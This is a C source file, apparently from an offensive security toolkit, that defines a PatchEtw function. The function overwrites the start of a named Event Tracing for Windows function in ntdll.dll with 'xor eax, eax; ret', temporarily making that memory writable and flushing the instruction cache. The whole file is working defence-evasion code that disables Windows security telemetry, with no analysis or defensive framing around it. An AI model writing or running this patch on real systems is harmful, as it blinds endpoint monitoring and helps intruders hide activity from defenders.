#include "Box.h"

// https://deepwiki.com/nullsection/SharpETW-Patch/3-etw-patching-technique

BOOL PatchEtw
(
	IN LPCSTR EtwApi
)
{

	DWORD	dwOldProt	= 0;
	PBYTE	pEtwFunc	= NULL;
	NTSTATUS status		= NULL;

	BYTE patch[] = {
		0x31, 0xC0, // xor eax, eax
		0xC3        // ret
	};

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
	{
		PRINT_ERROR("GetModuleHandleA");
		return FALSE;
	}

	INFO("[0x%p] Current Ntdll Handle", ntdll);

	pEtwFunc = GetProcAddress(ntdll, EtwApi);
	if (pEtwFunc == NULL)
	{
		PRINT_ERROR("GetProcAddress");
		return FALSE;
	}

	INFO("[0x%p] %s Handle", pEtwFunc, EtwApi);

	INFO("Original Bytes...");
	for (SIZE_T i = 0; i < sizeof(patch); i++)
	{
		printf("0x%02X ", pEtwFunc[i]);
	}

	printf("\n");

	if (!VirtualProtect(pEtwFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtect");
		return FALSE;
	}

	OKAY("Protection Changed --> PAGE_EXECUTE_READWRITE [RWX]");
	INFO("Patching Bytes...");

	memcpy(pEtwFunc, patch, sizeof(patch));

	INFO("New Bytes...");
	for (SIZE_T i = 0; i < sizeof(patch); i++)
	{
		printf("0x%02X ", pEtwFunc[i]);
	}

	printf("\n");

	if (!VirtualProtect(pEtwFunc, sizeof(patch), dwOldProt, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtect");
		return FALSE;
	}

	INFO("Memory Protection Restored");

	if (!FlushInstructionCache(GetCurrentProcess(), pEtwFunc, sizeof(patch))) // ensures CPU runs current ETW patch
	{
		PRINT_ERROR("FlushInstructionCache");
		return FALSE;
	}

	INFO("CPU Instructions Flushed!");
	OKAY("DONE!");

	return TRUE;

}